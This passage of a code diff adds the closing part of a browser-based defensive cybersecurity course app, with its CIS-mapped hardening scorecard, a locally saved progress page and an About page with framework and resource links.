+  machine.addEventListener('input',save);
+  AREAS.forEach((a,ai)=>{
+    const c=el('div','card');
+    const hd=el('h3',null,`${ai+1}. ${a.n}`);const cnt=el('span','pill');counts[ai]=cnt;
+    const top=el('div','prow');top.append(hd,cnt);c.appendChild(top);
+    c.appendChild(el('p','sum',`<small>${a.cis}</small><br>${a.d}`));
+    a.checks.forEach((txt,ci)=>{
+      const k=ai+'-'+ci;
+      const row=el('div','step'+(ticks[k]?' done':''));
+      const cb=el('input');cb.type='checkbox';cb.checked=!!ticks[k];cb.setAttribute('aria-label',txt);
+      cb.addEventListener('change',()=>{if(cb.checked)ticks[k]=true;else delete ticks[k];row.className='step'+(cb.checked?' done':'');save();refresh();});
+      row.append(cb,el('div','st',txt));
+      c.appendChild(row);
+    });
+    main.appendChild(c);
+  });
+  const ex=el('div','card');ex.appendChild(el('h3',null,'Outside the six areas'));
+  const t=el('table','cmds areas');
+  AREAS_EXTRA.forEach(([n,d])=>{const tr=el('tr');tr.appendChild(el('td',null,`<b>${n}</b>`));tr.appendChild(el('td',null,d));t.appendChild(tr);});
+  ex.appendChild(t);main.appendChild(ex);
+  const row=el('div','row');
+  const reset=el('button','btn sec sm','Clear scorecard');
+  let armed=false;
+  reset.addEventListener('click',()=>{
+    if(!armed){armed=true;reset.textContent='Tap again to confirm';return;}
+    store.set('scorecard',{});render();
+  });
+  row.append(totalPill,reset);main.appendChild(row);
+  main.appendChild(el('div','note','These are areas, not a list of answers. The specific weaknesses change on every machine; the skill is reasoning from the scenario brief and the standard, not memorizing. Source: CIS Critical Security Controls v8, Controls 2 to 8 and 10.'));
+  main.appendChild(linkBtn('btn sec sm',RES['cis-controls'][1],'CIS Controls list →'));
+  refresh();
+}
+
+function renderProgress(){
+  document.documentElement.style.setProperty('--accent','var(--l1)');
+  const h=el('div','lvhead');h.style.setProperty('--accent','var(--l1)');
+  h.innerHTML=`<div class="grade">My progress</div><div class="range">Saved in this browser only</div>`;
+  h.appendChild(el('p','intro','Every quiz, drill, flashcard set, lab and reflection you complete is counted here. Nothing is uploaded; clearing your browser data clears this.'));
+  main.appendChild(h);
+  const prog=el('div','prog');
+  LEVELS.forEach(l=>{
+    const ids=[];l.units.forEach(u=>u.blocks.forEach(b=>{if(b.id)ids.push(b.id);}));
+    const done=ids.filter(isDone).length;
+    const pct=ids.length?Math.round(done/ids.length*100):0;
+    const card=el('div','card');
+    card.style.setProperty('--accent',l.color);
+    card.innerHTML=`<div class="prow"><b>${l.grade}</b><small>${done} / ${ids.length} activities</small></div><div class="pbar"><i></i></div>`;
+    const bar=card.querySelector('.pbar i'); if(bar){bar.style.width=pct+'%';bar.style.background=l.color;}
+    const go=el('button','btn sec sm','Open '+l.grade);
+    go.addEventListener('click',()=>{current={level:l.id,unit:l.units[0].id,page:'level'};render();});
+    card.appendChild(go);
+    prog.appendChild(card);
+  });
+  main.appendChild(prog);
+  // overall
+  const all=allInteractiveIds();const ad=all.filter(isDone).length;const apct=all.length?Math.round(ad/all.length*100):0;
+  const o=el('div','card');
+  o.innerHTML=`<div class="prow"><b>Overall</b><small>${ad} / ${all.length} activities (${apct}%)</small></div><div class="pbar"><i></i></div>`;
+  const obar=o.querySelector('.pbar i'); if(obar)obar.style.width=apct+'%';
+  main.appendChild(o);
+  const row=el('div','row');
+  const reset=el('button','btn sec sm','Reset my progress');
+  const pill=el('span','pill');
+  let armed=false;
+  reset.addEventListener('click',()=>{
+    if(!armed){armed=true;reset.textContent='Tap again to confirm';pill.textContent='This clears everything saved in this browser.';pill.className='pill bad';return;}
+    MEM={};store.save();pill.textContent='Cleared';pill.className='pill ok';reset.textContent='Reset my progress';armed=false;render();
+  });
+  row.append(reset,pill);
+  main.appendChild(row);
+}
+
+function renderAbout(){
+  document.documentElement.style.setProperty('--accent','var(--l2)');
+  const h=el('div','lvhead');h.style.setProperty('--accent','var(--l2)');
+  h.innerHTML=`<div class="grade">About &amp; links</div><div class="range">How to use this, and where to go next</div>`;
+  main.appendChild(h);
+  const c1=el('div','card');
+  c1.innerHTML=`<h3>What this is</h3>
+    <p>Defense Ladder is a free, offline cybersecurity course built around Bloom’s revised taxonomy: you move from <b>remembering</b> facts (Freshman) to <b>creating</b> your own checklist, runbook and team plan (Senior). It maps to open frameworks: the <b>NICE Workforce Framework</b> for work roles, the <b>CIS Critical Security Controls v8</b> for the six hardening areas, and the <b>NIST Cybersecurity Framework 2.0</b> for the big picture.</p>
+    <p>It is informative at every level and gets more interactive as you climb: flashcards and quizzes early, then config-reading and triage drills, then builders for your own checklist and session plan. For hands-on work, use Lockdown Range (labs that run in your browser) or practice virtual machines you own. The same skills carry over to cyber defense exercises and competitions, capture-the-flag events, and IT and security jobs.</p>
+    <p><b>Unofficial practice;</b> not affiliated with or endorsed by Microsoft, Canonical, Linux Mint, the FreeBSD Project or Cisco. Commands and settings change between versions, so vendor documentation always wins over anything here.</p>`;
+  main.appendChild(c1);
+
+  const c2=el('div','card');
+  c2.innerHTML=`<h3>How the drills map to Bloom\u2019s taxonomy</h3>`;
+  const t=el('table','cmds');
+  [['Remember','Flashcards, vocabulary, the six hardening areas'],['Understand','Concept cards, matching, "which action is safe" quizzes'],['Apply','Command tables, hands-on labs, IOS configuration, the hardening scorecard'],['Analyze','Spot-the-problem in configs and logs, finding persistence'],['Evaluate','Rank the findings, judgment-under-pressure quizzes, ethics'],['Create','Checklist builder, session planner, team runbook, your own code']].forEach(([a,b])=>{
+    const tr=el('tr');tr.appendChild(el('td',null,`<b>${a}</b>`));tr.appendChild(el('td',null,b));t.appendChild(tr);
+  });
+  c2.appendChild(t);
+  main.appendChild(c2);
+
+  // grouped resource list
+  const groups=[['Vendor documentation and training','vendor'],['Standards and frameworks','standard'],['Open practice platforms','practice'],['Community (free, well-regarded)','community'],['Practice tools on this site','tool4that']];
+  groups.forEach(([title,kind])=>{
+    const card=el('div','card');card.appendChild(el('h3',null,title));
+    Object.keys(RES).forEach(k=>{if(RES[k][3]!==kind)return;const [name,url,why]=RES[k];const row=el('div','lk');row.innerHTML=`<span class="k ${kind}">${kindLabel(kind)}</span><div><a href="${url}" target="_blank" rel="noopener noreferrer">${name}</a><div class="d">${why}</div></div>`;card.appendChild(row);});
+    main.appendChild(card);
+  });
+
+  const foot=el('div','foot');
+  foot.innerHTML=`Bloom\u2019s revised taxonomy: Anderson &amp; Krathwohl (2001). Links open vendor, standards and well-regarded community sources; always cross-check community material against vendor documentation. Part of <a href="${HUB}" target="_blank" rel="noopener noreferrer">Tool4That</a>. Progress and notes stay in this browser; nothing is uploaded.`;
+  main.appendChild(foot);
+}
+
+/* =====================================================================
+   chrome refresh (rail dots + progress badges without full nav rebuild)
+   ===================================================================== */
+function refreshChrome(){
+  if(current.page==='level'){
+    const L=levelById(current.level);
+    const chips=document.querySelectorAll('.units .unit');
+    L.units.forEach((u,i)=>{
+      if(!chips[i])return;
+      const st=unitStatus(u);
+      const dot=chips[i].querySelector('.dot');
+      if(dot)dot.className='dot '+st;
+    });
+  }
+}
+
+/* =====================================================================
+   BOOT
+   ===================================================================== */
+buildRail();
+render();
+</script>
+<!-- tool4that:foot --><p style="text-align:center;margin:28px 0 22px;font:14px/1.4 system-ui,-apple-system,Segoe UI,Arial,sans-serif"><a href="../">More free tools at Tool4That</a></p><!-- /tool4that:foot -->
+</body>
+</html>
